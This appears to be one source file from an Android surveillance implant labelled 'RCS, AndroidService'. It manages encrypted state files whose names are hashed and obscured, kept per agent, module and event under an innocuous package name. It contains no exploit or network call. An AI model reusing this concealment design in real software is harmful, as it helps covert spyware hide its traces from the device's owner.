/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : Markup.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.networking.evidence;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectInput;
import java.io.ObjectInputStream;
import java.io.ObjectOutput;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.util.HashMap;

import com.android.networking.auto.Cfg;
import com.android.networking.crypto.CryptoException;
import com.android.networking.crypto.Digest;
import com.android.networking.crypto.Encryption;
import com.android.networking.crypto.Keys;
import com.android.networking.event.BaseEvent;
import com.android.networking.file.AutoFile;
import com.android.networking.file.Path;
import com.android.networking.module.BaseModule;
import com.android.networking.util.Check;
import com.android.networking.util.Utils;


/**
 * The Class Markup.
 */
public class Markup {

	private static final String TAG = "Markup"; //$NON-NLS-1$
	//$NON-NLS-1$
	public static final String MARKUP_EXTENSION = ".mm"; //$NON-NLS-1$
	public static byte markupSeed;
	public static boolean markupInit;
	private String markupId = "core"; //$NON-NLS-1$

	private String lognName;
	private AutoFile file;
	private final Encryption encryption;

	private Markup() {
		encryption = new Encryption(Keys.self().getAesKey());
	}

	/**
	 * Instantiates a new markup.
	 * 
	 * @param agentId_
	 *            the agent id_
	 * @param aesKey
	 *            the aes key
	 */
	protected Markup(final String agentId_) {
		this();
		markupId = agentId_;
	}

	public Markup(final Integer id) {
		this();
		markupId = id.toString();
	}

	protected Markup(final String string, int num) {
		this();
		markupId = string + num;

	}

	public Markup(BaseEvent event) {
		this("EVT" + event.getType(), event.getId());
	}

	public Markup(BaseModule module) {
		this("AGN" + module.getType());
	}

	public Markup(BaseModule module, int id) {
		this("MOD" + module.getType(), id);
	}

	/**
	 * Crea un markup vuoto.
	 * 
	 * @return true if successful
	 */
	public boolean createEmptyMarkup() {
		return writeMarkup(null);
	}

	/**
	 * 
	 * @param agentId
	 *            the agent id
	 * @param num
	 * @param addPath
	 *            the add path
	 * @return the string
	 */
	static String makeMarkupName(String agentId, final boolean addPath) {
		// final String markupName = Integer.toHexString(agentId);
		final String markupName = Utils.byteArrayToHex(Digest.SHA1(agentId.getBytes()));
		if (Cfg.DEBUG) {
			Check.requires(markupName != null, "null markupName"); //$NON-NLS-1$
		}
		if (Cfg.DEBUG) {
			Check.requires(markupName != "", "empty markupName"); //$NON-NLS-1$ //$NON-NLS-2$
		}

		String encName = ""; //$NON-NLS-1$

		if (addPath) {
			encName = Path.markup();
		}

		encName += Encryption.encryptName(markupName + MARKUP_EXTENSION, getMarkupSeed());

		if (Cfg.DEBUG) {
			Check.asserts(markupInit, "makeMarkupName: " + markupInit); //$NON-NLS-1$
		}
		return encName;
	}

	private static int getMarkupSeed() {
		if (!markupInit) {
			markupSeed = Keys.self().getAesKey()[0];
			markupInit = true;
		}

		return markupSeed;
	}

	/**
	 * Rimuove tutti i file di markup presenti sul filesystem.
	 * 
	 * @return
	 */

	public static synchronized int removeMarkups() {

		int numDeleted = 0;

		AutoFile dir = new AutoFile(Path.markup());
		String[] list = dir.list();
		for (String filename : list) {
			AutoFile file = new AutoFile(Path.markup(), filename);
			file.delete();
			numDeleted++;
		}
		// dir.delete();

		return numDeleted;
	}

	/**
	 * Check. if is markup. //$NON-NLS-1$
	 * 
	 * @return true, if is markup
	 */
	public synchronized boolean isMarkup() {
		if (Cfg.DEBUG) {
			Check.requires(markupId != null, "agentId null"); //$NON-NLS-1$
		}
		final String markupName = makeMarkupName(markupId, true);
		if (Cfg.DEBUG) {
			Check.asserts(markupName != "", "markupName empty"); //$NON-NLS-1$ //$NON-NLS-2$
		}

		final AutoFile fileRet = new AutoFile(markupName);
		return fileRet.exists();
	}

	/**
	 * Legge il file di markup specificato dall'AgentId (l'ID dell'agente che
	 * l'ha generato), torna un array di dati decifrati. Se il file non viene
	 * trovato o non e' possibile decifrarlo correttamente, torna null. Se il
	 * Markup e' vuoto restituisce un byte[0]. E' possibile creare dei markup
	 * vuoti, in questo caso non va usata la ReadMarkup() ma semplicemente la
	 * IsMarkup() per vedere se e' presente o meno.
	 * 
	 * @return the byte[]
	 * @throws IOException
	 *             Signals that an I/O exception has occurred.
	 */
	public synchronized byte[] readMarkup() throws IOException {
		if (Cfg.DEBUG) {
			Check.requires(markupId != null, "agentId null"); //$NON-NLS-1$
		}

		final String markupName = makeMarkupName(markupId, true);
		if (Cfg.DEBUG) {
			Check.asserts(markupName != "", "markupName empty"); //$NON-NLS-1$ //$NON-NLS-2$
		}

		final AutoFile fileRet = new AutoFile(markupName);

		if (fileRet.exists()) {
			final byte[] encData = fileRet.read();
			final int len = Utils.byteArrayToInt(encData, 0);

			byte[] plain = null;
			try {
				plain = encryption.decryptData(encData, len, 4);
			} catch (final CryptoException e) {
				if (Cfg.EXCEPTION) {
					Check.log(e);
				}

				return null;
			}

			if (Cfg.DEBUG) {
				Check.asserts(plain != null, "wrong decryption: null"); //$NON-NLS-1$
			}
			if (Cfg.DEBUG) {
				Check.asserts(plain.length == len, "wrong decryption: len"); //$NON-NLS-1$
			}

			return plain;
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Error (readMarkup): Markup file does not exists");//$NON-NLS-1$
			}
			return null;
		}
	}
	
/*	public int readMarkupInt() throws IOException{
		byte[] data = readMarkup();
		int value = Utils.byteArrayToInt(data, 0);
		return value;		
	}
	
	public void writeMarkupInt(int value){
		byte[] data = Utils.intToByteArray(value);
		writeMarkup(data);
	}*/

	/**
	 * Removes the markup.
	 */
	public synchronized void removeMarkup() {
		if (Cfg.DEBUG) {
			Check.requires(markupId != null, "agentId null"); //$NON-NLS-1$
		}

		final String markupName = makeMarkupName(markupId, true);
		if (Cfg.DEBUG) {
			Check.asserts(markupName != "", "markupName empty"); //$NON-NLS-1$ //$NON-NLS-2$
		}

		final AutoFile remove = new AutoFile(markupName);
		remove.delete();
	}

	/**
	 * Scrive un file di markup per salvare lo stato dell'agente, il parametro
	 * e' il buffer di dati. Al termine della scrittura il file viene chiuso,
	 * non e' possibile fare alcuna Append e un'ulteriore chiamata alla
	 * WriteMarkup() comportera' la sovrascrittura del vecchio markup. La
	 * funzione torna TRUE se e' andata a buon fine, FALSE altrimenti. Il
	 * contenuto scritto e' cifrato.
	 * 
	 * @param data
	 *            the data
	 * @param num
	 * @return true, if successful
	 */
	public synchronized boolean writeMarkup(final byte[] data) {
		final String markupName = makeMarkupName(markupId, true);

		if (Cfg.DEBUG) {
			Check.asserts(markupName != "", "markupName empty"); //$NON-NLS-1$ //$NON-NLS-2$
		}		

		final AutoFile fileRet = new AutoFile(markupName);

		// se il file esiste viene azzerato
		fileRet.create();

		if (data != null) {
			final byte[] encData = encryption.encryptData(data);

			if (Cfg.DEBUG) {
				Check.asserts(encData.length >= data.length, "strange data len"); //$NON-NLS-1$
			}

			fileRet.write(data.length);
			fileRet.append(encData);
		}

		return fileRet.exists();
	}

	public boolean writeMarkupSerializable(final Serializable object) throws IOException {
		final ByteArrayOutputStream bos = new ByteArrayOutputStream();
		final ObjectOutput out = new ObjectOutputStream(bos);
		out.writeObject(object);
		final byte[] data = bos.toByteArray();
		return writeMarkup(data);
	}

	public synchronized Object readMarkupSerializable() throws IOException {
		final byte[] data = readMarkup();
		final ByteArrayInputStream bis = new ByteArrayInputStream(data);
		final ObjectInput in = new ObjectInputStream(bis);
		try {
			final Object o = in.readObject();
			return o;
		} catch (final ClassNotFoundException e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " Error (readMarkupSerializable): " + e);//$NON-NLS-1$
			}
			throw new IOException();
		}
	}

}
